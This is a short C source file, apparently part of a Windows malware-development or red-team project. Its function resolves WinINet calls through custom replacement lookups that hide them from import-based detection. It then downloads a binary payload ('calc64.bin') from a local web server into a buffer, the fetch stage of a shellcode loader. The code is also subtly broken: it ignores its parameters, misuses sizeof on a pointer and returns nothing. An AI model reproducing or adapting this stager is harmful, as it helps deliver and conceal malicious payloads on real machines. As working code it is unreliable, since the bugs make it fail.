#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#include "GetterFunctions.h"

#pragma comment(lib, "wininet.lib")

typedef HINTERNET(WINAPI* INTERNETOPEN)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* INTERNETOPENURL)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* LPInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* LPInternetCloseHandle)(HINTERNET);


int fetchCode(const wchar_t* hostname, const wchar_t* file, int port, unsigned char** buffer, DWORD* size) {
// Get a handle to the DLL module
    HMODULE hDll = GetModuleHandleReplacement(TEXT("wininet.dll"));
    DWORD bytesRead;
    DWORD totalBytesRead = 0;

    // If the handle is valid, try to get the function address
    if (hDll != NULL) {
        INTERNETOPEN pInternetOpen = (INTERNETOPEN)GetProcAddressReplacement(hDll, "InternetOpenW");
        INTERNETOPENURL pInternetOpenUrl = (INTERNETOPENURL)GetProcAddressReplacement(hDll, "InternetOpenUrlW");
        LPInternetReadFile pInternetReadFile = (LPInternetReadFile)GetProcAddressReplacement(hDll, "InternetReadFile");
        LPInternetCloseHandle pInternetCloseHandle = (LPInternetCloseHandle)GetProcAddressReplacement(hDll, "InternetCloseHandle");

        if (pInternetOpen != NULL && pInternetOpenUrl != NULL && pInternetReadFile != NULL && pInternetCloseHandle != NULL) {
            HINTERNET hInternet = pInternetOpen(L"User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (hInternet != NULL) {
                HINTERNET hConnect = pInternetOpenUrl(hInternet, L"http://localhost:10000/calc64.bin", NULL, 0, INTERNET_FLAG_RELOAD, 0);
                if (hConnect != NULL) {
                    while (pInternetReadFile(hConnect, buffer + totalBytesRead, sizeof(buffer) - totalBytesRead, &bytesRead) && bytesRead > 0) {
                        totalBytesRead += bytesRead;
                    }
                    // Close the connection handle
                    InternetCloseHandle(hConnect);
                }
                // Close the hInternet handle
                InternetCloseHandle(hInternet);
            }
        }
    }
}
